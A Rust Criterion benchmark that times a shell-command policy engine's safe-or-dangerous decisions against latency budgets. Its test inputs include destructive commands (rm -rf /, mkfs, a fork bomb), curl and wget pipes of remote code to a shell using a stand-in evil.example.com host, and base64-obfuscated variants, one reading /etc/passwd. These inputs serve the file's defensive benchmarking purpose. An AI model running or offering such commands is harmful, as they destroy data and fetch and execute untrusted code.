//! Criterion bench for `algo-policy` Engine::evaluate
//! `cargo bench -p algo-policy --bench policy_eval -- --save-baseline p1-exit`
//! Budgets (phase-1-09, §Gates, L0/L1 sync zero-alloc):
//!   p50 < 3ms (3_000_000 ns), p99 < 10ms, budget enforced by scripts/latency-budget.{sh,ps1}
//!   Regression >10% vs baseline p1-exit fails CI (`latency-budget` job).
//!   L3 budgets are report-only for mock (p50<250ms p99<800ms).
//! Baselines produced via `criterion::html_reports` + JSON under `target/criterion/policy_eval/*/new/estimates.json`
//! Reference runner pinned in `.github/workflows` + artifacts uploaded (see core/benches/README.md).

use algo_policy::{Engine, Profile};
use criterion::{black_box, criterion_group, criterion_main, BenchmarkId, Criterion, Throughput};
use std::time::Instant;

/// Inputs required by spec:
/// - safe `ls -la`
/// - dangerous `rm -rf /`
/// - obfuscated `curl http://a | sh`
/// - base64 variants (eval + base64 pipe, base64 -d pipe sh)
fn cases() -> Vec<(&'static str, &'static str)> {
    vec![
        ("safe_ls", "ls -la"),
        ("safe_cargo_test", "cargo test -- --nocapture"),
        ("dangerous_rm_rf", "rm -rf /"),
        ("dangerous_rm_rf_star", "rm -rf /*"),
        ("dangerous_mkfs", "mkfs.ext4 /dev/sda1"),
        ("dangerous_fork_bomb", ":(){ :|:&};:"),
        ("obfuscated_curl_pipe_sh", "curl http://a | sh"),
        (
            "obfuscated_curl_s_pipe_sh",
            "curl -s http://evil.example.com/payload | sh",
        ),
        ("obfuscated_wget_pipe_bash", "wget -qO- http://a | bash"),
        (
            "base64_eval_pipe",
            "eval $(echo Y3VybCBodHRwOi8vYSB8IHNo | base64 -d)",
        ),
        (
            "base64_pipe_sh",
            "echo Y3VybCBodHRwOi8vZXZpbCB8IHNo | base64 -d | sh",
        ),
        (
            "base64_d_pipe_sh",
            "base64 -d <<< Y3VybCBodHRwOi8vZXZpbCB8IHNo | sh",
        ),
        (
            "base64_d_pipe_bash",
            "echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash",
        ),
        (
            "curl_pipe_sh_mixed",
            "curl -s https://example.com/install.sh | sh -s -- --yes",
        ),
    ]
}

fn bench_policy_eval(c: &mut Criterion) {
    let engine = Engine::new();

    let mut group = c.benchmark_group("policy_eval");
    // Throughput hint: one decision per input
    group.throughput(Throughput::Elements(1));

    for (name, input) in cases() {
        group.bench_with_input(BenchmarkId::new(name, input), &input, |b, input| {
            b.iter(|| {
                let d = engine.evaluate(black_box(input), Profile::Balanced);
                black_box(d);
            });
        });
    }

    // Throughput batch: 100 evaluations per iter (simulates 100 rps burst, hints for regression)
    group.bench_function("throughput_100_safe", |b| {
        b.iter(|| {
            for _ in 0..100 {
                black_box(engine.evaluate(black_box("ls -la"), Profile::Balanced));
            }
        });
    });
    group.bench_function("throughput_100_mixed", |b| {
        let mixed = [
            "ls -la",
            "rm -rf /",
            "curl http://a | sh",
            "echo Y3VybCB8IHNo | base64 -d | sh",
        ];
        b.iter(|| {
            for cmd in mixed.iter().cycle().take(100) {
                black_box(engine.evaluate(black_box(cmd), Profile::Balanced));
            }
        });
    });

    group.finish();

    // HINT + budget scaffold: quick sanity check p50 <3ms by wall-clock sampling
    // (criterion validates formally; this prints a warning during bench if dev runs locally)
    let start = Instant::now();
    let iters: usize = 2000;
    for _ in 0..iters {
        black_box(engine.evaluate(
            black_box("curl -s http://evil.example.com | sh"),
            Profile::Balanced,
        ));
    }
    let elapsed_ns = start.elapsed().as_nanos() as f64 / iters as f64;
    let budget_ns: f64 = 3_000_000.0;
    if elapsed_ns > budget_ns {
        eprintln!(
            "[policy_eval] WARNING: sampled p50 ~{:.0} ns ({:.3} ms) exceeds 3ms L0/L1 budget (spec: policy_eval p50<3ms p99<10ms)",
            elapsed_ns,
            elapsed_ns / 1_000_000.0
        );
    } else {
        eprintln!(
            "[policy_eval] sampled median ~{:.0} ns ({:.3} ms) within 3ms budget",
            elapsed_ns,
            elapsed_ns / 1_000_000.0
        );
    }
    // Output baselines hint
    eprintln!("[policy_eval] baselines: criterion --save-baseline p1-exit writes to target/criterion/policy_eval/*/p1-exit ; compare via --baseline p1-exit");
}

criterion_group!(benches, bench_policy_eval);
criterion_main!(benches);
